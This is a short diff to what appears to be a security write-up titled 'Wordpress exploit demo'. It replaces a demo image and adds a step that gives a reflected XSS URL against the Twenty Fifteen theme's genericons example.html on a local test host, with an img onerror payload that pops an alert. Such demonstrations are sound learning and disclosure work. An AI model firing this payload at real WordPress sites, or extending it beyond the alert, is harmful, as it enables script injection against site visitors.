@@ -64,6 +64,13 @@ Type:
 
 Wordpress exploit demo
 
-<img src="exploit2.gif" width="800">
+<img src="exploit3.gif" width="800">
 
+Description:
+
+Step by step:
+
+```html
+http://wpdistillery.vm/wp-content/themes/twentyfifteen/genericons/example.html#<img/src/onerror=alert("You_are_hacked!")>
+```
 
